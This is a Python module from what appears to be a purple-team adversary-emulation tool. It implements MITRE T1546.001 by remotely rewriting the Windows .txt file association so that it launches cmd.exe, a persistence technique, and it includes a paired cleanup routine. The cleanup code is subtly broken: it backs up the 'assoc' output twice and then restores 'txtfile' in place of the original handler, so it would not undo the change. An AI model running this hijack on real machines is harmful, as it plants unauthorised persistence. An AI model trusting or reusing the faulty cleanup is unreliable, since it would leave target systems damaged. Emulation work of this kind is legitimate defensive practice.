from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Change a file association for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            "$assoc = cmd /c 'assoc .txt'; "
            "Set-Content -Path 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt' "
            "-Value $assoc; "
            "$ftype = cmd /c 'assoc .txt'; "
            "Add-Content -Path 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt' "
            "-Value $ftype"
        )
        await conn.run_ps(backup_cmd)
        change_cmd = "cmd /c 'ftype txtfile=C:\\Windows\\System32\\cmd.exe %1'"
        result = await conn.run_ps(change_cmd)
        return TechniqueResult(
            technique_id="T1546.001",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.001 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.001",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        restore_cmd = (
            "$backup = Get-Content -Path "
            "'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt'; "
            "$orig = $backup[0] -replace '.txt=', ''; "
            "cmd /c \"ftype txtfile=$orig %1\"; "
            "Remove-Item -Path 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt' -Force"
        )
        await conn.run_ps(restore_cmd)
    except Exception as e:
        logger.warning(f"T1546.001 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
